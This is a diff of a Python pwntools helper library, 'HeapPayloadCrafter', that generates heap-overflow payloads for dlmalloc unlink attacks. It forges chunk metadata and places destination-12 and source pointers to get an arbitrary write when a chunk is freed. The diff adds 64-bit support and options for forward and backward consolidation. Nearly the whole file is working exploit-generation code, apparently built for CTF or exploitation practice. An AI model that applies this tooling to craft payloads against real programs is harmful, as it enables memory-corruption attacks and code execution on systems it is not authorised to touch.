@@ -1,18 +1,11 @@
 
 from pwn import *
 
-# TODO support for overwriting using forward consolidation
-# TODO support for overwriting using forward consolidation only
-# TODO edgecase that metadata's prevsize can be used as size => DONE
-# TODO add support for arch 32 and 64   => DONE
-# TODO support for overwriting using frontlink method
-# TODO what if we can overwrite ONLY the metadata of C
-
 """
 Terminology :
-    Block whose metadata is being overwritten and later freed     :    "C"
-    Block that is 'before' C(crafted block)                       :    "BEFORE_C"
-    Block that is 'after'  C(crafted block)                       :    "AFTER_C"
+    Chunk whose metadata is being overwritten and later freed     :    "C"
+    Chunk that is 'before' C(crafted block); "C - PREV_SIZE_C"    :    "BEFORE_C"
+    Chunk that is 'after'  C(crafted block)  "C + SIZE_C"         :    "AFTER_C"
 """
 
 class HeaplibException(Exception):
@@ -30,14 +23,15 @@ class HeapPayloadCrafter(object):
         self.source               = source
         self.destination_2        = kw.get("destination_2", None)
         self.source_2             = kw.get("source_2", None)
-        self.size                 = kw.get("size", 4)
         self.only_fwd_consol      = kw.get("only_fwd_consol", False)
+        self.no_back_consol       = kw.get("no_back_consol", False)
         self.allocator            = kw.get("allocator", "dlmalloc")
         self.pre_length           = kw.get("pre_length", None)
         self.post_length          = kw.get("post_length", None)
         self.pre_preset           = kw.get("pre_preset", {})
         self.post_preset          = kw.get("post_preset", {})
         self.populating_character = kw.get("populating_character", "*")
+        self.size                 = kw.get("size", context.bits/8)
 
     def can_use(self, content, start, length):
         return content[start: start+length] == [self.populating_character] * length
@@ -67,15 +61,15 @@ class HeapPayloadCrafter(object):
             segment = full_list[i: i+unit_len]
             if len(segment) != unit_len:
                 if backward:
-                    print "Backward consolidation not possible. Attempting "\
-                          "Forward consolidation."
+                    log.info("Backward consolidation not possible. Attempting "\
+                             "Forward consolidation.")
                     self.only_fwd_consol = True
+                    self.no_back_consol = True
                     return None
                 else:
                     raise HeaplibException("Not enough space when performing forward consolidation")
                     return None
             elif self.can_use(segment, 0, len(segment)):
-                #PREV_SIZE_C = -(i + (self.size*2))
                 contents = flat(values_list)
                 full_list[i:i+unit_len] = list(contents)
                 assert len(full_list) == total_length
@@ -97,9 +91,11 @@ class HeapPayloadCrafter(object):
             # Find a contiguous chunk of (self.size*4) bytes that can
             # be used
             i, unit_len = 0, self.size*4
-            values_list = [0xfffffff0, 0xfffffff1, self.destination-12, self.source]
+            # -16 and -15 are random values for the BEFORE_C's PREV_SIZE and SIZE
+            values_list = [-16, -15, self.destination-12, self.source]
             PREV_SIZE_C = self.find_usable_offset(i, post, unit_len, values_list, self.post_length)
-            PREV_SIZE_C = -(PREV_SIZE_C + (self.size*2))
+            if not PREV_SIZE_C: PREV_SIZE_C = -1
+            else: PREV_SIZE_C = -(PREV_SIZE_C + (self.size*2))
 
         # If we need to use forward consolidation
         if self.only_fwd_consol or (self.destination_2 and self.source_2):
@@ -111,19 +107,35 @@ class HeapPayloadCrafter(object):
         else:
             # Find a contiguous chunk towards the end of `prev` that can be
             # used to place
-            i, unit_len = len(prev), self.size*2
+            i, unit_len = len(prev), self.size*4
             i -= unit_len
-            if prev[-4:] == [self.populating_character]*self.size:
-                SIZE_C = -4
-                after_c = flat(0x41414141)
-                prev[-4:] = list(after_c)
+            if prev[-self.size:] == [self.populating_character]*self.size:
+                SIZE_C = -self.size
+                after_c = flat(-1) # this value is not used
+                prev[-self.size:] = list(after_c)
             else:
-                values_list = [0xfffffff0, 0xfffffff8]
-                SIZE_C = self.find_usable_offset(i, prev, unit_len, values_list, self.pre_length)
+                values_list = [-16, -1, -16, -32]
+                SIZE_C = self.find_usable_offset(i, prev, unit_len, values_list, self.pre_length, backward=False)
                 SIZE_C = -SIZE_C
-            SIZE_C &= (-2)   # fffffffe or its equivalent based on arch
+            if self.no_back_consol:
+                SIZE_C |= 1
+            else:
+                SIZE_C &= (-2)   # fffffffe or its equivalent based on arch
 
-        return PREV_SIZE_C, post, SIZE_C, prev
+        return prev, (PREV_SIZE_C, SIZE_C), post
 
     def __str__(self):
         return ''.join(self.get_exploit())
+
+
+
+
+"""
+# TODO support for overwriting using forward consolidation
+# TODO support for overwriting using forward consolidation only
+# TODO edgecase that metadata's prevsize can be used as size => DONE
+# TODO add support for arch 32 and 64   => DONE
+# TODO support for overwriting using frontlink method
+# TODO what if we can overwrite ONLY the metadata of C
+"""
+
